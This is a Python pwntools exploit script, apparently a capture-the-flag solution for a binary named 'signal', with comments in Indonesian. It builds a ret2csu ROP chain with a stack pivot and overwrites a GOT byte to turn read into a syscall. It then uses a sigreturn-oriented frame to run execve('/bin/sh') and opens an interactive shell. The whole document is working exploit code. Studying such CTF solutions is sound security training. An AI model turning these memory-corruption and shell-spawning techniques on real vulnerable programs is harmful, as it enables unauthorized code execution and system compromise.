from pwn import *

def exploit():
    p = process("./signal")
    binary = ELF("./signal")
    context.arch = 'amd64'
    
    read_got = binary.got['read']
    read_plt = binary.plt['read']
    leave = 0x4006e2
    str_bin_sh = 0x601100
    csu_init1 = 0x000000000040074a # pop rbx
    csu_init2 = 0x0000000000400730 # mov rsi, r14
    csu_fini = 0x0000000000400760 # ret
    junk = "JUNK" * 2
    bin_sh = "/bin/sh\x00"
    len_bin_sh = len(bin_sh)

    def ret2csu(func_GOT, rdi, rsi, rdx, rbx_after=0, rbp_after=0, r12_after=0, r13_after=0, r14_after=0, r15_after=0):
        ret_csu = p64(0x0)          # pop rbx
        ret_csu += p64(0x1)         # pop rbp
        ret_csu += p64(func_GOT)    # pop r12
        ret_csu += p64(rdi)         # pop r13
        ret_csu += p64(rsi)         # pop r14
        ret_csu += p64(rdx)         # pop r15
        ret_csu += p64(csu_init2)
        ret_csu += junk
        ret_csu += p64(rbx_after)
        ret_csu += p64(rbp_after)
        ret_csu += p64(r12_after)
        ret_csu += p64(r13_after)
        ret_csu += p64(r14_after)
        ret_csu += p64(r15_after)
        
        return ret_csu

    padding = 264

    payload = 'A' * 256
    payload += p64(0x601110)
    payload += p64(csu_init1)
    # Menambah batas input menjadi 0x300 sehingga kita bisa leluasa membuat payload
    payload += ret2csu(read_got, 0, 0x601118, 0x300, rbp_after=0x601110)
    payload += p64(leave)
    payload = payload.ljust(0x200, 'A')

    gdb.attach(p, '''
                b *main+65
                ''')
    p.send(payload)

    payload = ''
    payload += p64(csu_init1)
    
    # Overwrite lsb dari read_got menjadi '\x7f' (syscall)
    payload += ret2csu(read_got, 0, read_got, 1, rbp_after=0x601190)
    
    # Leave dengan melakukan set pada register RAX
    # ---- Explanation of leave   ----
    # mov esp, ebp
    # pop ebp
    # ---- End of Explanation ----
    payload += p64(0x4006db) # address sebelum leave; ret di fungsi main untuk set register RAX
    payload += p64(csu_init1)
    
    # Mengisi '/bin/sh\x00' di .bss dan set rdx ke 15 untuk mengubah rax ke 15 
    # referensi: https://github.com/sturmisch/cscctf-problem/tree/master/2019/qual/pwn/signal
    # syscall 15 adalah sigreturn
    payload += ret2csu(read_got, 0, 0x601590, 15, rbp_after=0x601210)
    payload += p64(read_plt) # read sudah di overwrite menjadi syscall

    # dilanjutkan dengan melakukan sigRop
    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = 0x601590
    frame.rsp = 0x601a10
    frame.rip = read_plt
    payload += str(frame)

    payload = payload.ljust(0x300, 'A')

    p.send(payload)
    p.send('\x7f')
    p.send(bin_sh.ljust(15, '\x00'))
    
    p.interactive()

if __name__ == "__main__":
    exploit()